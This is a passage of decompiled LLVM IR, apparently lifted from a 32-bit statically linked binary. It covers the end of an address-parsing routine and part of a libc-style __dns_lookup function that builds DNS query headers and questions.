  %v10_80576a9 = icmp slt i32 %v1_80576a9, 0
  %v3_80576af = icmp eq i1 %v10_80576a9, %v8_80576a9
  %v4_80576af = icmp eq i1 %v9_80576a9, false
  %v5_80576af = and i1 %v4_80576af, %v3_80576af
  br i1 %v5_80576af, label %dec_label_pc_8057700, label %dec_label_pc_80576b1

dec_label_pc_80576b1:                             ; preds = %dec_label_pc_80576a2
  %v1_80576b1 = add i32 %v0_80576b1, 1
  store i32 %v1_80576b1, i32* @ecx, align 4
  br label %dec_label_pc_80576b2

dec_label_pc_80576b2:                             ; preds = %dec_label_pc_805769e, %dec_label_pc_80576b1
  %v1_80576a2 = phi i32 [ 0, %dec_label_pc_805769e ], [ %v3_80576a5, %dec_label_pc_80576b1 ]
  %v4_80576b2 = phi i32 [ %v4_80576b2.pre, %dec_label_pc_805769e ], [ %v6_80576b2, %dec_label_pc_80576b1 ]
  %v0_80576b1 = phi i32 [ %v0_805769433, %dec_label_pc_805769e ], [ %v1_80576b1, %dec_label_pc_80576b1 ]
  %v1_80576b2 = inttoptr i32 %v0_80576b1 to i8*
  %v2_80576b2 = load i8, i8* %v1_80576b2, align 1
  %v3_80576b2 = zext i8 %v2_80576b2 to i32
  %v5_80576b2 = and i32 %v4_80576b2, -256
  %v6_80576b2 = or i32 %v3_80576b2, %v5_80576b2
  store i32 %v6_80576b2, i32* @edx, align 4
  %v2_80576b4 = sext i8 %v2_80576b2 to i32
  %v2_80576b7 = mul nsw i32 %v2_80576b4, 2
  %v3_80576b7 = add i32 %v2_80576b7, %v0_805768e.pre
  %v4_80576b7 = inttoptr i32 %v3_80576b7 to i16*
  %v5_80576b7 = load i16, i16* %v4_80576b7, align 2
  %v2_80576bc = and i16 %v5_80576b7, 8
  %v3_80576bc = icmp eq i16 %v2_80576bc, 0
  %v1_80576be = icmp eq i1 %v3_80576bc, false
  br i1 %v1_80576be, label %dec_label_pc_80576a2, label %dec_label_pc_80576c0

dec_label_pc_80576c0:                             ; preds = %dec_label_pc_80576b2
  %v8_80576c0 = sub nsw i32 2, %v2_80576d734
  %v9_80576c0 = and i32 %v8_80576c0, %v2_80576d734
  %v10_80576c0 = icmp slt i32 %v9_80576c0, 0
  %v11_80576c0 = icmp eq i32 %v2_80576d734, 3
  %v12_80576c0 = icmp slt i32 %v2_80576d734, 3
  %v3_80576c4 = icmp eq i1 %v12_80576c0, %v10_80576c0
  %v4_80576c4 = icmp eq i1 %v11_80576c0, false
  %v5_80576c4 = and i1 %v4_80576c4, %v3_80576c4
  br i1 %v5_80576c4, label %dec_label_pc_80576ce, label %dec_label_pc_80576c6

dec_label_pc_80576c6:                             ; preds = %dec_label_pc_80576c0
  %v10_80576c6 = icmp eq i8 %v2_80576b2, 46
  %v1_80576c9 = icmp eq i1 %v10_80576c6, false
  br i1 %v1_80576c9, label %dec_label_pc_8057700, label %dec_label_pc_80576cb

dec_label_pc_80576cb:                             ; preds = %dec_label_pc_80576c6
  %v1_80576cb = add i32 %v0_80576b1, 1
  store i32 %v1_80576cb, i32* @ecx, align 4
  br label %dec_label_pc_80576d7

dec_label_pc_80576ce:                             ; preds = %dec_label_pc_80576c0
  %v1_80576ce = add i32 %v0_80576b1, 1
  store i32 %v1_80576ce, i32* @ecx, align 4
  %v4_80576cf = icmp eq i8 %v2_80576b2, 0
  br i1 %v4_80576cf, label %dec_label_pc_80576d7, label %dec_label_pc_80576d3

dec_label_pc_80576d3:                             ; preds = %dec_label_pc_80576ce
  %v2_80576d3 = and i16 %v5_80576b7, 32
  %v3_80576d3 = icmp eq i16 %v2_80576d3, 0
  br i1 %v3_80576d3, label %dec_label_pc_8057700, label %dec_label_pc_80576d7

dec_label_pc_80576d7:                             ; preds = %dec_label_pc_80576d3, %dec_label_pc_80576ce, %dec_label_pc_80576cb
  %v0_80576943 = phi i32 [ %v1_80576ce, %dec_label_pc_80576d3 ], [ %v1_80576ce, %dec_label_pc_80576ce ], [ %v1_80576cb, %dec_label_pc_80576cb ]
  %v3_80576d7 = add nuw nsw i32 %v2_80576d734, 1
  %v2_80576da = mul i32 %v0_80576f532, 256
  %v2_80576dd = or i32 %v1_80576a2, %v2_80576da
  %v7_80576e3 = icmp sgt i32 %v2_80576d734, 3
  br i1 %v7_80576e3, label %dec_label_pc_80576e5, label %dec_label_pc_805768e

dec_label_pc_80576e5:                             ; preds = %dec_label_pc_80576d7
  %v4_80576e5 = icmp eq i32 %arg2, 0
  br i1 %v4_80576e5, label %dec_label_pc_8057702, label %dec_label_pc_80576f1

dec_label_pc_80576f1:                             ; preds = %dec_label_pc_80576e5
  %v1_80576f5 = call i32 @llvm.bswap.i32(i32 %v2_80576dd)
  %v2_80576f7 = inttoptr i32 %arg2 to i32*
  store i32 %v1_80576f5, i32* %v2_80576f7, align 4
  br label %dec_label_pc_8057702

dec_label_pc_8057700:                             ; preds = %dec_label_pc_80576d3, %dec_label_pc_80576c6, %dec_label_pc_805768e, %dec_label_pc_80576a2, %entry
  br label %dec_label_pc_8057702

dec_label_pc_8057702:                             ; preds = %dec_label_pc_80576e5, %dec_label_pc_80576f1, %dec_label_pc_8057700
  %v0_8057707 = phi i32 [ 1, %dec_label_pc_80576e5 ], [ 1, %dec_label_pc_80576f1 ], [ 0, %dec_label_pc_8057700 ]
  ret i32 %v0_8057707

; uselistorder directives
  uselistorder i32 %v2_80576b4, { 1, 0 }
  uselistorder i32 %v6_80576b2, { 1, 0 }
  uselistorder i8 %v2_80576b2, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80576b1, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80576a9, { 1, 0 }
  uselistorder i32 %v3_80576a5, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805769433, { 1, 0 }
  uselistorder i32 %v2_80576d734, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 17, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 1, 2, 3, 4, 5, 18, 16 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8057702, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057700, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_80576b2, { 1, 0 }
  uselistorder label %dec_label_pc_805768e, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_805771e = call i32 @malloc(i32 512)
  store i32 %v2_805771e, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_805771e, i32* @ebp, align 4
  %v2_805772c = call i32 @malloc(i32 1025)
  store i32 %v2_805772c, i32* %eax.global-to-local, align 4
  %v12_8057735 = ptrtoint i32* %stack_var_-236 to i32
  %v1_8057738 = icmp eq i32 %v2_805771e, 0
  br i1 %v1_8057738, label %dec_label_pc_8057db1, label %dec_label_pc_8057740

dec_label_pc_8057740:                             ; preds = %entry
  %v1_8057740 = icmp eq i32 %v2_805772c, 0
  br i1 %v1_8057740, label %dec_label_pc_8057db1, label %dec_label_pc_8057748

dec_label_pc_8057748:                             ; preds = %dec_label_pc_8057740
  %v5_8057748 = icmp eq i32 %arg2, 0
  br i1 %v5_8057748, label %dec_label_pc_8057db1, label %dec_label_pc_8057756

dec_label_pc_8057756:                             ; preds = %dec_label_pc_8057748
  %v4_8057756 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8057756, i32* %eax.global-to-local, align 4
  %v2_805775d = load i8, i8* %arg1, align 1
  %v3_805775d = icmp eq i8 %v2_805775d, 0
  br i1 %v3_805775d, label %dec_label_pc_8057db1, label %dec_label_pc_8057766

dec_label_pc_8057766:                             ; preds = %dec_label_pc_8057756
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_805776a = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_805776a, i32* %eax.global-to-local, align 4
  store i32 %v4_8057756, i32* %edx.global-to-local, align 4
  %v2_805778d = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_805778d, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v6_8057795 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-52, i32 134541533, i32 ptrtoint (i8** @global_var_8067780.314 to i32))
  store i32 %v6_8057795, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_8067780.314 to i8*), i8** %stack_var_-252, align 4
  %v2_80577a1 = call i32 @pthread_mutex_lock(i32 ptrtoint (i8** @global_var_8067780.314 to i32))
  %v0_80577a6 = load i64, i64* @global_var_8067798.315, align 8
  %v1_80577a6 = trunc i64 %v0_80577a6 to i32
  %v1_80577ab = ashr i32 %v1_80577a6, 31
  %v6_80577ac = and i64 %v0_80577a6, 4294967295
  %v8_80577ac = zext i32 %v1_80577ab to i64
  %v9_80577ac = mul nuw i64 %v8_80577ac, 4294967296
  %v10_80577ac = or i64 %v9_80577ac, %v6_80577ac
  %v14_80577ac = srem i64 %v10_80577ac, %tmp33
  %v15_80577ac = trunc i64 %v14_80577ac to i32
  %v0_80577b3 = load i16, i16* @global_var_8062de4.316, align 4
  %v2_80577c2 = load i8*, i8** %stack_var_-252, align 4
  %v3_80577c2 = ptrtoint i8* %v2_80577c2 to i32
  store i32 %v3_80577c2, i32* %eax.global-to-local, align 4
  store i32 134541533, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v4_80577c7 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-52, i32 1)
  store i32 %v4_80577c7, i32* %eax.global-to-local, align 4
  %v4_805796e = inttoptr i32 %v15_80577ac to i8*
  %v1_8057d8c72 = add i32 %v12_8057735, 28
  %v2_8057d8c73 = inttoptr i32 %v1_8057d8c72 to i32*
  %v3_8057d8c74 = load i32, i32* %v2_8057d8c73, align 4
  %tmp = icmp ult i32 %v3_8057d8c74, 3
  br i1 %tmp, label %dec_label_pc_80577ec, label %dec_label_pc_8057db1

dec_label_pc_80577ec:                             ; preds = %dec_label_pc_8057766, %dec_label_pc_8057d8c.backedge
  %v0_80577f383 = phi i32 [ %v0_8057d8c.pre, %dec_label_pc_8057d8c.backedge ], [ %v12_8057735, %dec_label_pc_8057766 ]
  %v1_80577ec = add i32 %v0_80577f383, 20
  %v2_80577ec = inttoptr i32 %v1_80577ec to i32*
  %v3_80577ec = load i32, i32* %v2_80577ec, align 4
  %v13_80577ec = icmp eq i32 %v3_80577ec, -1
  br i1 %v13_80577ec, label %dec_label_pc_80577ec.dec_label_pc_8057802_crit_edge, label %dec_label_pc_80577f3

dec_label_pc_80577ec.dec_label_pc_8057802_crit_edge: ; preds = %dec_label_pc_80577ec
  %v0_8057802.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057802

dec_label_pc_80577f3:                             ; preds = %dec_label_pc_80577ec
  %v3_80577f6 = load i32, i32* %v2_80577ec, align 4
  %v5_80577f6 = add i32 %v0_80577f383, -16
  %v6_80577f6 = inttoptr i32 %v5_80577f6 to i32*
  store i32 %v3_80577f6, i32* %v6_80577f6, align 4
  %v1_80577fa = call i32 @__libc_close(i32 -1)
  store i32 %v1_80577fa, i32* %eax.global-to-local, align 4
  %v0_80577ff = load i32, i32* @esp, align 4
  %v1_80577ff = add i32 %v0_80577ff, 16
  br label %dec_label_pc_8057802

dec_label_pc_8057802:                             ; preds = %dec_label_pc_80577ec.dec_label_pc_8057802_crit_edge, %dec_label_pc_80577f3
  %v1_8057802 = phi i32 [ %v0_80577f383, %dec_label_pc_80577ec.dec_label_pc_8057802_crit_edge ], [ %v1_80577ff, %dec_label_pc_80577f3 ]
  %v0_8057802 = phi i32 [ %v0_8057802.pre, %dec_label_pc_80577ec.dec_label_pc_8057802_crit_edge ], [ %v1_80577fa, %dec_label_pc_80577f3 ]
  %v2_8057802 = add i32 %v1_8057802, -4
  %v3_8057802 = inttoptr i32 %v2_8057802 to i32*
  store i32 %v0_8057802, i32* %v3_8057802, align 4
  %v1_8057803 = add i32 %v1_8057802, -8
  %v2_8057803 = inttoptr i32 %v1_8057803 to i32*
  store i32 512, i32* %v2_8057803, align 4
  %v1_8057808 = add i32 %v1_8057802, -12
  %v2_8057808 = inttoptr i32 %v1_8057808 to i32*
  store i32 0, i32* %v2_8057808, align 4
  %v2_805780a = add i32 %v1_8057802, -16
  %v3_805780a = inttoptr i32 %v2_805780a to i32*
  store i32 %v2_805771e, i32* %v3_805780a, align 4
  %v4_805780b = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_80577ac, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805780b, i32* %eax.global-to-local, align 4
  %v0_8057810 = load i32, i32* @esp, align 4
  %v1_8057813 = add i32 %v0_8057810, 8
  %v2_8057813 = inttoptr i32 %v1_8057813 to i32*
  store i32 48, i32* %v2_8057813, align 4
  %v1_8057815 = add i32 %v0_8057810, 4
  %v2_8057815 = inttoptr i32 %v1_8057815 to i32*
  store i32 0, i32* %v2_8057815, align 4
  %v1_8057817 = add i32 %v0_8057810, 84
  store i32 %v1_8057817, i32* @ebx, align 4
  %v3_805781b = inttoptr i32 %v0_8057810 to i32*
  store i32 %v1_8057817, i32* %v3_805781b, align 4
  %v4_805781c = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_80577ac, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805781c, i32* %eax.global-to-local, align 4
  %v0_8057821 = load i32, i32* @esp, align 4
  %v1_8057821 = add i32 %v0_8057821, 72
  %v2_8057821 = inttoptr i32 %v1_8057821 to i32*
  %v3_8057821 = load i32, i32* %v2_8057821, align 4
  store i32 %v3_8057821, i32* %eax.global-to-local, align 4
  %v1_8057825 = add i32 %v0_8057821, 116
  %v2_8057825 = inttoptr i32 %v1_8057825 to i32*
  store i32 1, i32* %v2_8057825, align 4
  %v0_805782d = load i32, i32* @esp, align 4
  %v1_805782d = add i32 %v0_805782d, 104
  %v2_805782d = inttoptr i32 %v1_805782d to i32*
  store i32 1, i32* %v2_805782d, align 4
  %v0_8057835 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057835 = add i32 %v0_8057835, 1
  %v1_8057836 = urem i32 %v1_8057835, 65536
  store i32 %v1_8057836, i32* %eax.global-to-local, align 4
  %v1_805783b = load i32, i32* @esp, align 4
  %v2_805783b = add i32 %v1_805783b, 72
  %v3_805783b = inttoptr i32 %v2_805783b to i32*
  store i32 %v1_8057836, i32* %v3_805783b, align 4
  %v0_805783f = load i32, i32* %eax.global-to-local, align 4
  %v1_805783f = load i32, i32* @esp, align 4
  %v2_805783f = add i32 %v1_805783f, 84
  %v3_805783f = inttoptr i32 %v2_805783f to i32*
  store i32 %v0_805783f, i32* %v3_805783f, align 4
  %v0_8057843 = load i32, i32* @esp, align 4
  %v1_8057846 = add i32 %v0_8057843, 8
  %v2_8057846 = inttoptr i32 %v1_8057846 to i32*
  store i32 512, i32* %v2_8057846, align 4
  %v2_805784b = add i32 %v0_8057843, 4
  %v3_805784b = inttoptr i32 %v2_805784b to i32*
  store i32 %v2_805771e, i32* %v3_805784b, align 4
  %v0_805784c = load i32, i32* @ebx, align 4
  %v3_805784c = inttoptr i32 %v0_8057843 to i32*
  store i32 %v0_805784c, i32* %v3_805784c, align 4
  %v0_805784d = call i32 @__encode_header()
  store i32 %v0_805784d, i32* %eax.global-to-local, align 4
  %v0_8057852 = load i32, i32* @esp, align 4
  %v2_8057855 = icmp slt i32 %v0_805784d, 0
  store i32 %v0_805784d, i32* @ebx, align 4
  br i1 %v2_8057855, label %dec_label_pc_8057db1, label %dec_label_pc_805785f

dec_label_pc_805785f:                             ; preds = %dec_label_pc_8057802
  %v2_805785f = add i32 %v0_8057852, 12
  %v3_805785f = inttoptr i32 %v2_805785f to i32*
  store i32 %v0_805784d, i32* %v3_805785f, align 4
  %v1_8057860 = add i32 %v0_8057852, 8
  %v2_8057860 = inttoptr i32 %v1_8057860 to i32*
  store i32 1025, i32* %v2_8057860, align 4
  %v1_8057865 = add i32 %v0_8057852, 256
  %v2_8057865 = inttoptr i32 %v1_8057865 to i32*
  %v3_8057865 = load i32, i32* %v2_8057865, align 4
  %v5_8057865 = add i32 %v0_8057852, 4
  %v6_8057865 = inttoptr i32 %v5_8057865 to i32*
  store i32 %v3_8057865, i32* %v6_8057865, align 4
  %v1_805786c = add i32 %v0_8057852, 28
  %v2_805786c = inttoptr i32 %v1_805786c to i32*
  %v3_805786c = load i32, i32* %v2_805786c, align 4
  %v6_805786c = inttoptr i32 %v0_8057852 to i32*
  store i32 %v3_805786c, i32* %v6_805786c, align 4
  %v4_8057870 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_80577ac, i32 ptrtoint (i32* @0 to i32))
  %v0_8057875 = load i32, i32* @esp, align 4
  %v1_8057878 = add i32 %v0_8057875, 8
  %v2_8057878 = inttoptr i32 %v1_8057878 to i32*
  store i32 ptrtoint (i32* @global_var_8062de8.231 to i32), i32* %v2_8057878, align 4
  %v1_805787d = add i32 %v0_8057875, 4
  %v2_805787d = inttoptr i32 %v1_805787d to i32*
  store i32 134541533, i32* %v2_805787d, align 4
  %v1_8057882 = add i32 %v0_8057875, 200
  store i32 %v1_8057882, i32* %eax.global-to-local, align 4
  %v3_8057889 = inttoptr i32 %v0_8057875 to i32*
  store i32 %v1_8057882, i32* %v3_8057889, align 4
  %v4_805788a = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_80577ac, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805788a, i32* %eax.global-to-local, align 4
  %v0_805788f = load i32, i32* @esp, align 4
  %v1_805788f = inttoptr i32 %v0_805788f to i32*
  store i32 ptrtoint (i32* @global_var_8062de8.231 to i32), i32* %v1_805788f, align 4
  %v1_8057896 = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8057896, i32* %eax.global-to-local, align 4
  %v0_805789b = load i32, i32* @esp, align 4
  %v1_805789b = add i32 %v0_805789b, 56
  %v2_805789b = inttoptr i32 %v1_805789b to i32*
  %v3_805789b = load i32, i32* %v2_805789b, align 4
  store i32 %v3_805789b, i32* %edx.global-to-local, align 4
  %v1_805789f = add i32 %v0_805789b, 268
  %v2_805789f = inttoptr i32 %v1_805789f to i32*
  %v3_805789f = load i32, i32* %v2_805789f, align 4
  store i32 %v3_805789f, i32* %eax.global-to-local, align 4
  %v2_80578a6 = mul i32 %v3_805789b, 4
  %v3_80578a6 = add i32 %v3_805789f, %v2_80578a6
  %v4_80578a6 = inttoptr i32 %v3_80578a6 to i32*
  %v5_80578a6 = load i32, i32* %v4_80578a6, align 4
  store i32 %v5_80578a6, i32* %edx.global-to-local, align 4
  %v2_80578a9 = add i32 %v0_805789b, 48
  %v3_80578a9 = inttoptr i32 %v2_80578a9 to i32*
  store i32 %v5_80578a6, i32* %v3_80578a9, align 4
  %v0_80578ad = load i32, i32* @esp, align 4
  %v1_80578ad = add i32 %v0_80578ad, 16
  %v1_80578b0 = add i32 %v0_80578ad, 52
  %v2_80578b0 = inttoptr i32 %v1_80578b0 to i32*
  %v3_80578b0 = load i32, i32* %v2_80578b0, align 4
  %v5_80578b0 = icmp slt i32 %v3_80578b0, 0
  br i1 %v5_80578b0, label %dec_label_pc_805785f.dec_label_pc_80578f6_crit_edge, label %dec_label_pc_80578b7

dec_label_pc_805785f.dec_label_pc_80578f6_crit_edge: ; preds = %dec_label_pc_805785f
  %v0_80578f6.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80578f6

dec_label_pc_80578b7:                             ; preds = %dec_label_pc_805785f
  store i32 %v3_80578b0, i32* %eax.global-to-local, align 4
  %v1_80578bb = load i32, i32* @global_var_8067e64.317, align 4
  %v2_80578bb = sub i32 %v3_80578b0, %v1_80578bb
  %v8_80578bb = xor i32 %v1_80578bb, %v3_80578b0
  %v9_80578bb = xor i32 %v2_80578bb, %v3_80578b0
  %v10_80578bb = and i32 %v9_80578bb, %v8_80578bb
  %v11_80578bb = icmp slt i32 %v10_80578bb, 0
  %v13_80578bb = icmp slt i32 %v2_80578bb, 0
  %v2_80578c1 = icmp eq i1 %v13_80578bb, %v11_80578bb
  br i1 %v2_80578c1, label %dec_label_pc_80578f6, label %dec_label_pc_80578c3

dec_label_pc_80578c3:                             ; preds = %dec_label_pc_80578b7
  %v2_80578c3 = add i32 %v0_80578ad, 12
  %v3_80578c3 = inttoptr i32 %v2_80578c3 to i32*
  store i32 %v3_80578b0, i32* %v3_80578c3, align 4
  %v1_80578c4 = add i32 %v0_80578ad, 8
  %v2_80578c4 = inttoptr i32 %v1_80578c4 to i32*
  store i32 1025, i32* %v2_80578c4, align 4
  %v1_80578c9 = add i32 %v0_80578ad, 4
  %v2_80578c9 = inttoptr i32 %v1_80578c9 to i32*
  store i32 ptrtoint (i32* @global_var_805cfa8.318 to i32), i32* %v2_80578c9, align 4
  %v1_80578ce = add i32 %v0_80578ad, 28
  %v2_80578ce = inttoptr i32 %v1_80578ce to i32*
  %v3_80578ce = load i32, i32* %v2_80578ce, align 4
  %v6_80578ce = inttoptr i32 %v0_80578ad to i32*
  store i32 %v3_80578ce, i32* %v6_80578ce, align 4
  %v0_80578d2 = call i32 @__GI_strncat()
  store i32 %v0_80578d2, i32* %eax.global-to-local, align 4
  %v0_80578d7 = load i32, i32* @esp, align 4
  %v1_80578da = add i32 %v0_80578d7, 8
  %v2_80578da = inttoptr i32 %v1_80578da to i32*
  store i32 1025, i32* %v2_80578da, align 4
  %v1_80578df = add i32 %v0_80578d7, 52
  %v2_80578df = inttoptr i32 %v1_80578df to i32*
  %v3_80578df = load i32, i32* %v2_80578df, align 4
  store i32 %v3_80578df, i32* %edx.global-to-local, align 4
  %v1_80578e3 = mul i32 %v3_80578df, 4
  %v2_80578e3 = add i32 %v1_80578e3, 134643268
  %v3_80578e3 = inttoptr i32 %v2_80578e3 to i32*
  %v4_80578e3 = load i32, i32* %v3_80578e3, align 4
  %v6_80578e3 = add i32 %v0_80578d7, 4
  %v7_80578e3 = inttoptr i32 %v6_80578e3 to i32*
  store i32 %v4_80578e3, i32* %v7_80578e3, align 4
  %v1_80578ea = add i32 %v0_80578d7, 28
  %v2_80578ea = inttoptr i32 %v1_80578ea to i32*
  %v3_80578ea = load i32, i32* %v2_80578ea, align 4
  %v6_80578ea = inttoptr i32 %v0_80578d7 to i32*
  store i32 %v3_80578ea, i32* %v6_80578ea, align 4
  %v0_80578ee = call i32 @__GI_strncat()
  store i32 %v0_80578ee, i32* %eax.global-to-local, align 4
  %v0_80578f3 = load i32, i32* @esp, align 4
  %v1_80578f3 = add i32 %v0_80578f3, 16
  br label %dec_label_pc_80578f6

dec_label_pc_80578f6:                             ; preds = %dec_label_pc_805785f.dec_label_pc_80578f6_crit_edge, %dec_label_pc_80578b7, %dec_label_pc_80578c3
  %v1_80578f6 = phi i32 [ %v1_80578ad, %dec_label_pc_805785f.dec_label_pc_80578f6_crit_edge ], [ %v1_80578ad, %dec_label_pc_80578b7 ], [ %v1_80578f3, %dec_label_pc_80578c3 ]
  %v0_80578f6 = phi i32 [ %v0_80578f6.pre, %dec_label_pc_805785f.dec_label_pc_80578f6_crit_edge ], [ %v3_80578b0, %dec_label_pc_80578b7 ], [ %v0_80578ee, %dec_label_pc_80578c3 ]
  %v2_80578f6 = add i32 %v1_80578f6, -4
  %v3_80578f6 = inttoptr i32 %v2_80578f6 to i32*
  store i32 %v0_80578f6, i32* %v3_80578f6, align 4
  %v0_80578f7 = load i32, i32* %eax.global-to-local, align 4
  %v2_80578f7 = add i32 %v1_80578f6, -8
  %v3_80578f7 = inttoptr i32 %v2_80578f7 to i32*
  store i32 %v0_80578f7, i32* %v3_80578f7, align 4
  %v1_80578f8 = add i32 %v1_80578f6, -12
  %v2_80578f8 = inttoptr i32 %v1_80578f8 to i32*
  store i32 1, i32* %v2_80578f8, align 4
  %v1_80578fa = add i32 %v1_80578f6, 184
  store i32 %v1_80578fa, i32* %eax.global-to-local, align 4
  %v2_8057901 = add i32 %v1_80578f6, -16
  %v3_8057901 = inttoptr i32 %v2_8057901 to i32*
  store i32 %v1_80578fa, i32* %v3_8057901, align 4
  %v3_8057902 = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_80577ac)
  store i32 %v3_8057902, i32* %eax.global-to-local, align 4
  %v0_8057907 = load i32, i32* @esp, align 4
  %v1_8057907 = add i32 %v0_8057907, 28
  %v2_8057907 = inttoptr i32 %v1_8057907 to i32*
  %v3_8057907 = load i32, i32* %v2_8057907, align 4
  store i32 %v3_8057907, i32* %eax.global-to-local, align 4
  %v1_805790b = add i32 %v0_8057907, 260
  %v2_805790b = inttoptr i32 %v1_805790b to i32*
  %v3_805790b = load i32, i32* %v2_805790b, align 4
  store i32 %v3_805790b, i32* @edx, align 4
  %v1_8057912 = add i32 %v0_8057907, 224
  %v2_8057912 = inttoptr i32 %v1_8057912 to i32*
  store i32 1, i32* %v2_8057912, align 4
  %v0_805791d = load i32, i32* %eax.global-to-local, align 4
  %v1_805791d = load i32, i32* @esp, align 4
  %v2_805791d = add i32 %v1_805791d, 216
  %v3_805791d = inttoptr i32 %v2_805791d to i32*
  store i32 %v0_805791d, i32* %v3_805791d, align 4
  %v1_8057929 = load i32, i32* @ebx, align 4
  %v2_8057929 = sub i32 512, %v1_8057929
  store i32 %v2_8057929, i32* %eax.global-to-local, align 4
  %v0_805792b = load i32, i32* @edx, align 4
  %v1_805792b = load i32, i32* @esp, align 4
  %v2_805792b = add i32 %v1_805792b, 220
  %v3_805792b = inttoptr i32 %v2_805792b to i32*
  store i32 %v0_805792b, i32* %v3_805792b, align 4
  %v0_8057932 = load i32, i32* @esp, align 4
  %v0_8057935 = load i32, i32* %eax.global-to-local, align 4
  %v2_8057935 = add i32 %v0_8057932, 8
  %v3_8057935 = inttoptr i32 %v2_8057935 to i32*
  store i32 %v0_8057935, i32* %v3_8057935, align 4
  %v1_8057936 = load i32, i32* @ebx, align 4
  %v2_8057936 = add i32 %v1_8057936, %v2_805771e
  %v2_805793a = add i32 %v0_8057932, 4
  %v3_805793a = inttoptr i32 %v2_805793a to i32*
  store i32 %v2_8057936, i32* %v3_805793a, align 4
  %v1_805793b = add i32 %v0_8057932, 216
  store i32 %v1_805793b, i32* @eax, align 4
  %v3_8057942 = inttoptr i32 %v0_8057932 to i32*
  store i32 %v1_805793b, i32* %v3_8057942, align 4
  %v0_8057943 = call i32 @__encode_question()
  store i32 %v0_8057943, i32* %eax.global-to-local, align 4
  %v0_8057948 = load i32, i32* @esp, align 4
  %v2_805794b = icmp slt i32 %v0_8057943, 0
  store i32 %v0_8057943, i32* @esi, align 4
  br i1 %v2_805794b, label %dec_label_pc_8057db1, label %dec_label_pc_8057955

dec_label_pc_8057955:                             ; preds = %dec_label_pc_80578f6
  %v1_8057955 = add i32 %v0_8057948, 172
  %v2_8057955 = inttoptr i32 %v1_8057955 to i16*
  store i16 2, i16* %v2_8057955, align 2
  %v1_805795f = load i32, i32* @esp, align 4
  %v2_805795f = add i32 %v1_805795f, -4
  %v3_805795f = inttoptr i32 %v2_805795f to i32*
  store i32 %v0_8057943, i32* %v3_805795f, align 4
  %v1_8057960 = add i32 %v1_805795f, 164
  store i32 %v1_8057960, i32* %eax.global-to-local, align 4
  %v2_8057967 = add i32 %v1_805795f, -8
  %v3_8057967 = inttoptr i32 %v2_8057967 to i32*
  store i32 %v1_8057960, i32* %v3_8057967, align 4
  %v1_8057968 = add i32 %v1_805795f, 32
  %v2_8057968 = inttoptr i32 %v1_8057968 to i32*
  %v3_8057968 = load i32, i32* %v2_8057968, align 4
  %v5_8057968 = add i32 %v1_805795f, -12
  %v6_8057968 = inttoptr i32 %v5_8057968 to i32*
  store i32 %v3_8057968, i32* %v6_8057968, align 4
  %v1_805796c = add i32 %v1_805795f, -16
  %v2_805796c = inttoptr i32 %v1_805796c to i32*
  store i32 10, i32* %v2_805796c, align 4
  %v5_805796e = call i32 @inet_pton(i32 -1, i8* %v4_805796e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805796e, i32* %eax.global-to-local, align 4
  %v0_8057973 = load i32, i32* @esp, align 4
  %v1_8057973 = add i32 %v0_8057973, 16
  %tmp47 = icmp slt i32 %v5_805796e, 1
  br i1 %tmp47, label %dec_label_pc_8057984, label %dec_label_pc_805797a

dec_label_pc_805797a:                             ; preds = %dec_label_pc_8057955
  %v1_805797a = add i32 %v0_8057973, 172
  %v2_805797a = inttoptr i32 %v1_805797a to i16*
  store i16 10, i16* %v2_805797a, align 2
  %v0_8057984.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057984

dec_label_pc_8057984:                             ; preds = %dec_label_pc_8057955, %dec_label_pc_805797a
  %v0_805799b = phi i32 [ %v1_8057973, %dec_label_pc_8057955 ], [ %v0_8057984.pre, %dec_label_pc_805797a ]
  %v1_8057984 = add i32 %v0_805799b, 156
  %v2_8057984 = inttoptr i32 %v1_8057984 to i16*
  %v3_8057984 = load i16, i16* %v2_8057984, align 2
